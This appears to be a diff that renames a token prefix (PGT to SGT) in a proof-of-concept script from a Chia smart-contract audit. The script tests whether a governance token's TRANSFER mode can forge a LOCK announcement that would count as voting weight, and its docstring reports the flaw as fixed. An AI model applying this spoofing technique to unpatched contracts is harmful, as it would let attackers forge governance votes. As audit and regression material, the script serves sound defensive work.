@@ -1,19 +1,19 @@
-"""PoC: PGT TRANSFER mode can spoof a governance LOCK announcement.
+"""PoC: SGT TRANSFER mode can spoof a governance LOCK announcement.
 
-Audit reference: ``research/CANON_CHIA_PROJECT_AUDIT_2026_04_26.md`` (POP-CANON-001).
+Audit reference: ``research/CANON_CHIA_PROJECT_AUDIT_2026_04_26.md`` (V1-CANON-001).
 
 Run:
-    PYTHONPATH=. .venv/bin/python tests/poc_pgt_lock_announcement_spoof.py
+    PYTHONPATH=. .venv/bin/python tests/poc_sgt_lock_announcement_spoof.py
 
 Pre-fix vulnerable output:
     forged_lock_announcement_present=True
     create_coin_count=1
-    STATUS: VULNERABLE — attack succeeded (PGT remained free; tracker would
+    STATUS: VULNERABLE — attack succeeded (SGT remained free; tracker would
             accept the forged LOCK announcement as voting weight).
 
 Post-fix output (current):
     STATUS: FIXED — attack rejected by check_no_protocol_prefix_abuse.
-    The PGT wrapper now forbids inner puzzles from emitting any
+    The SGT wrapper now forbids inner puzzles from emitting any
     CREATE_PUZZLE_ANNOUNCEMENT or CREATE_COIN_ANNOUNCEMENT.
 
 Regression tests covering the fix:
@@ -25,19 +25,19 @@ from __future__ import annotations
 from chia.types.blockchain_format.program import Program
 from chia_rs.sized_bytes import bytes32
 
-from solslot_puzzles.pgt_driver import (
-    PGT_TRANSFER,
+from solslot_puzzles.sgt_driver import (
+    SGT_TRANSFER,
     SINGLETON_LAUNCHER_HASH,
     make_proposal_tracker_struct,
-    pgt_free_inner_mod,
-    pgt_free_inner_puzzle,
-    pgt_locked_inner_mod,
+    sgt_free_inner_mod,
+    sgt_free_inner_puzzle,
+    sgt_locked_inner_mod,
 )
 
 
 CREATE_COIN = 51
 CREATE_PUZZLE_ANNOUNCEMENT = 62
-PROTOCOL_PREFIX = b"\x50"
+PROTOCOL_PREFIX = b"\x53"
 LOCK_TAG = b"LOCK"
 
 
@@ -50,8 +50,8 @@ def main() -> None:
         SINGLETON_LAUNCHER_HASH,
     )
 
-    pgt_locked_mod_hash = bytes32(pgt_locked_inner_mod().get_tree_hash())
-    pgt_free_mod_hash = bytes32(pgt_free_inner_mod().get_tree_hash())
+    sgt_locked_mod_hash = bytes32(sgt_locked_inner_mod().get_tree_hash())
+    sgt_free_mod_hash = bytes32(sgt_free_inner_mod().get_tree_hash())
 
     proposal_hash = bytes32(b"\xee" * 32)
     amount = 600_000
@@ -77,22 +77,22 @@ def main() -> None:
         )
     )
 
-    pgt_free = pgt_free_inner_puzzle(
-        pgt_locked_mod_hash,
+    sgt_free = sgt_free_inner_puzzle(
+        sgt_locked_mod_hash,
         tracker_struct,
         bytes32(malicious_inner.get_tree_hash()),
     )
 
-    print("PGT LOCK announcement spoof PoC")
+    print("SGT LOCK announcement spoof PoC")
     print("-" * 72)
-    print(f"pgt_free_mod_hash={pgt_free_mod_hash.hex()}")
+    print(f"sgt_free_mod_hash={sgt_free_mod_hash.hex()}")
     print(f"proposal_hash={proposal_hash.hex()}")
     print(f"lock_content={lock_content.hex()}")
     print()
 
     try:
-        out = pgt_free.run(
-            Program.to([PGT_TRANSFER, malicious_inner, 0, 0])
+        out = sgt_free.run(
+            Program.to([SGT_TRANSFER, malicious_inner, 0, 0])
         ).as_python()
     except Exception as e:
         # Post-fix: the filter raises (x).  Attack rejected.
@@ -113,7 +113,7 @@ def main() -> None:
     print(f"create_coin_count={create_coin_count}")
     print()
     if forged_lock and create_coin_count == 1:
-        print("STATUS: VULNERABLE — attack succeeded (PGT remained free).")
+        print("STATUS: VULNERABLE — attack succeeded (SGT remained free).")
     print()
     print("Emitted conditions:")
     for condition in out:
